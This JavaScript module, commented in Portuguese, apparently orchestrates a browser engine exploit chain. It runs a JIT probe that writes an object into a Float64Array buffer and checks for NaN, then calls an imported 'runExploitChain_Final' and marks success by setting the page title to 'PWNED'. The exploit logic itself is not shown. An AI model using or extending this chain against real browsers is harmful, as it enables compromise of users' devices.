// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para chamar o arquivo correto)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';

// CORREÇÃO: Importando do arquivo correto que estamos editando.
import {
    FNAME_MODULE,
    runExploitChain_Final
} from './testArrayBufferVictimCrash.mjs';

// A função de teste do JIT permanece como um sanity check útil.
async function testJITBehavior() {
    logS3("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    
    if (high === 0x7ff80000 && low === 0) {
        logS3("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        logS3("INESPERADO: O JIT não converteu para NaN.", 'warn', 'testJITBehavior');
    }
}

// O runner chama a função do módulo de exploit importado.
async function runUltimateExploitStrategy() {
    const FNAME_RUNNER = "runUltimateExploitStrategy"; 
    logS3(`==== INICIANDO ESTRATÉGIA (${FNAME_MODULE}) ====`, 'test', FNAME_RUNNER);
    
    // Chamando a função do módulo que acabamos de corrigir.
    const result = await runExploitChain_Final();

    if (result && result.success) {
        logS3(`  RUNNER: CADEIA DE EXPLORAÇÃO BEM-SUCEDIDA!`, "vuln", FNAME_RUNNER);
        logS3(`  RUNNER: Mensagem: ${result.message}`, "good", FNAME_RUNNER);
        document.title = "PWNED by " + FNAME_MODULE;
    } else {
        const errorMsg = result ? result.errorOccurred : "Resultado indefinido do exploit.";
        logS3(`  RUNNER: A cadeia de exploração falhou: ${errorMsg}`, "critical", FNAME_RUNNER);
        document.title = FNAME_MODULE + ": FAIL";
    }

    logS3(`==== ESTRATÉGIA (${FNAME_MODULE}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = true;

    await testJITBehavior();
    await PAUSE_S3(500);
    
    await runUltimateExploitStrategy();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;
}
